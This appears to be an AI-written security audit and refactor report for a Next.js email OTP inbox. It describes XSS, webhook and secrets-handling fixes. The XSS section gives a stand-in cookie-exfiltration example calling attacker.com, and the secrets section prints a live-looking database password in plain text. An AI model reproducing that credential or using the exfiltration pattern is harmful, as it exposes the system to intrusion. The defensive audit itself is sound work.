# MailSifu — Deep Code Analysis & Refactor Report

**Date:** 2026-03-31
**Analyst:** Claude Opus 4.6
**Codebase:** Next.js 15.5 + TypeScript + Prisma 5 + Supabase PostgreSQL + Auth.js 5 beta

---

## Phase 1: Database Connection

**Status:** Already resolved. The production `DATABASE_URL` was updated prior to this analysis.

- Health endpoint confirms: `{"ok":true,"db":"ok"}`
- Pooler connection at `aws-1-ap-southeast-1.pooler.supabase.com:6543` is working
- The `.env` file uses the correct pooler URL with `pgbouncer=true&connection_limit=1`

---

## Phase 2: What Was Fixed

### CRITICAL — XSS Vulnerability

**File:** `src/app/app/inbox/[id]/page.tsx:157-162`

The message detail page rendered raw email HTML via `dangerouslySetInnerHTML={{ __html: message.bodyHtml }}`. Email HTML from external senders can contain:
- `<script>` tags
- `<img onerror="...">` event handlers
- `<iframe>` embedding malicious pages
- CSS-based data exfiltration (`background: url(attacker.com/steal?cookie=...)`)

**Fix:** Replaced with plain-text rendering only. Since this is an OTP inbox, the text body contains all necessary content. If HTML rendering is needed in the future, integrate a sanitization library like DOMPurify.

### CRITICAL — Webhook Timing Attack Resistance

**Files:**
- `src/lib/forwardemail-webhook.ts:56-62`
- `src/lib/resend-webhook.ts:53-61`

Both webhook signature verifiers used a manual XOR-based constant-time comparison loop. While the intent was correct, the implementation was fragile — the manual loop doesn't account for V8 JIT optimizations that may short-circuit the comparison.

**Fix:** Replaced with `crypto.timingSafeEqual()`, the Node.js standard library function designed specifically for this purpose. Wrapped in try/catch to handle length mismatches (which `timingSafeEqual` throws on rather than returning false).

### HIGH — Unawaited Server Action in Server Component

**File:** `src/app/app/inbox/[id]/page.tsx:43-45`

`markAsRead(message.id)` was called without `await` in a server component. This is a fire-and-forget call that could be killed before completion in serverless environments. The inbox list page (`inbox/page.tsx:47`) correctly uses `after()` for this.

**Fix:** Added `import { after } from 'next/server'` and wrapped the call: `after(() => markAsRead(message.id))`. This ensures the mark-as-read executes after the response is sent, without blocking rendering and without risk of premature termination.

### HIGH — Webhook Payload Size Limits

**Files:**
- `src/app/api/webhooks/forwardemail/route.ts`
- `src/app/api/webhooks/resend/route.ts`

Both webhook routes read the entire request body as text with no size limit, then store the raw payload in the database. An attacker could send a multi-gigabyte payload to exhaust memory or fill the database.

**Fix:** Added 1MB payload size limit checks (both Content-Length header and actual body length) before processing. Returns 413 if exceeded.

### MEDIUM — `output: 'standalone'` on Vercel

**File:** `next.config.ts:4`

The `output: 'standalone'` setting was configured for Hostinger deployment but is unnecessary and suboptimal on Vercel. Vercel's build system handles output optimization natively, and `standalone` can interfere with Vercel's automatic serverless function splitting.

**Fix:** Removed `output: 'standalone'` from next.config.ts.

### LOW — Loading Skeleton Mismatch

**Files:**
- `src/app/app/inbox/loading.tsx`
- `src/app/app/domains/loading.tsx`
- `src/app/app/domains/[id]/loading.tsx`

All three loading skeletons rendered a dark sidebar (`background: '#1c1c1a'`), but the actual Sidebar component uses a light peach background (`background: '#FFF0E8'`). This caused a jarring flash when the page loaded.

**Fix:** Updated all three loading skeletons to match the actual sidebar appearance — light background, correct width (w-64), and matching nav item shapes.

---

## Phase 3: Issues Found (Not Fixed — Require Discussion)

### 1. Secrets in `.env` Files Committed to Repo

**Severity:** CRITICAL
**Files:** `.env`, `.env.production`, `.env.vercel`

These files contain:
- `AUTH_SECRET` (JWT signing key)
- `DATABASE_URL` with password `Datasabian123.`
- `FORWARD_EMAIL_API_KEY`
- `BOOTSTRAP_ADMIN_TOKEN`
- `VERCEL_OIDC_TOKEN`

**Recommendation:** These files should be in `.gitignore` (`.env` partially is, but `.env.production` and `.env.vercel` are tracked). Rotate all secrets immediately. The database password and auth secret are exposed in version control.

### 2. `.gitignore` Missing Critical Entries

**Current `.gitignore`:**
```
.env*.local
```

**Should also include:**
```
.env
.env.production
.env.vercel
.vercel/
```

### 3. No CSRF Protection on Webhook Endpoints

**Severity:** MEDIUM
**Files:** Both webhook routes

When `FORWARD_EMAIL_WEBHOOK_SECRET` is empty (as in local dev), webhooks accept any payload without verification in non-production environments. This is acceptable for dev, but the comment on the ForwardEmail route says "reject in production if missing" — if the Vercel env var is ever accidentally cleared, the webhook becomes completely open.

**Recommendation:** Consider requiring the secret in all environments, or add an explicit `ALLOW_UNSIGNED_WEBHOOKS=true` env var for dev.

### 4. `resendDomainId` Field Name Misleading

**Severity:** LOW
**File:** `prisma/schema.prisma:96`

The `MailDomain.resendDomainId` field now stores a Forward Email domain ID (not a Resend domain ID). The CLAUDE.md mentions Forward Email as primary, but the field name is misleading.

**Recommendation:** Rename to `externalDomainId` or `providerDomainId` in a future migration.

### 5. No Database Index on `MailAlias.address` Lookup

**Severity:** MEDIUM
**File:** `src/lib/inbound.ts:107`

The `storeInboundMessage` function does `prisma.mailAlias.findUnique({ where: { address: toAddress } })` on every inbound email. The `address` field has `@unique` which creates an index, so this is actually fine. However, `MailDomain` is looked up by `domain` which also has `@unique` — also fine.

**No action needed** — Prisma's `@unique` creates indexes automatically.

### 6. WebhookEventLog Unbounded Growth

**Severity:** MEDIUM
**File:** `prisma/schema.prisma:148-158`

The `WebhookEventLog` table stores every webhook payload with no TTL or cleanup. For an OTP inbox, this will grow indefinitely.

**Recommendation:** Add a cron job or scheduled task to purge logs older than 30 days. Consider truncating `payload` to a reasonable size (the 1MB limit added helps but logs will still accumulate).

### 7. `document.execCommand('copy')` Deprecated

**Severity:** LOW
**File:** `src/app/app/inbox/InboxView.tsx:59-64`

The clipboard fallback uses the deprecated `document.execCommand('copy')`. Modern browsers all support `navigator.clipboard.writeText()`.

**Recommendation:** Remove the fallback — all target browsers support the Clipboard API.

### 8. `document.dispatchEvent(new CustomEvent('toggleSidebar'))` Pattern

**Severity:** LOW
**Files:** `src/components/TopBar.tsx:29`, `src/components/Sidebar.tsx:17-19`

The sidebar toggle uses a custom DOM event for cross-component communication. This works but is fragile — it bypasses React's state management and won't survive a refactor to a different rendering strategy.

**Recommendation:** For a small app this is acceptable. If the app grows, consider a shared context or Zustand store.

### 9. `WEBHOOK_URL` Computed at Module Load Time

**Severity:** LOW
**Files:** `src/app/app/domains/actions.ts:8`, `src/app/app/domains/[id]/actions.ts:15`

```ts
const WEBHOOK_URL = `${process.env.AUTH_URL ?? 'https://mailsifu.com'}/api/webhooks/forwardemail`
```

This is evaluated when the module is loaded. If `AUTH_URL` is not set at module load time (e.g., in edge cases), it falls back correctly. However, the pattern of reading env vars at module scope rather than inside functions means they can't be changed without a restart.

**Recommendation:** Move inside the function that uses it, or accept this as intentional (env vars don't change at runtime on Vercel).

### 10. Google Fonts External Stylesheet in Layout

**Severity:** LOW
**File:** `src/app/layout.tsx:29-31`

Material Symbols are loaded from an external Google Fonts CDN with a print-media trick to avoid blocking. This works but adds a dependency on Google's CDN availability. The icon font is ~400KB.

**Recommendation:** Consider self-hosting the subset of icons actually used, or switching to SVG icons to reduce bundle size and eliminate the external dependency.

---

## Architecture Summary

The codebase is well-structured for a small internal tool:
- Clean separation of concerns (lib/, components/, app/api/)
- Proper use of server components and server actions
- Auth middleware correctly separates Edge-safe config from Node.js-only auth logic
- Prisma schema is well-designed with appropriate indexes and relations
- OTP extraction heuristics are solid with multi-tier confidence scoring

**Overall quality:** Good for an early-stage internal tool. The XSS fix was the most critical issue. The secrets-in-repo situation needs immediate attention.

---

## Deployment

- **Build:** Successful (zero errors, zero warnings)
- **Deploy:** Production deployment completed
- **Health:** `https://mailsifu.com/api/health` returns `{"ok":true,"db":"ok"}`
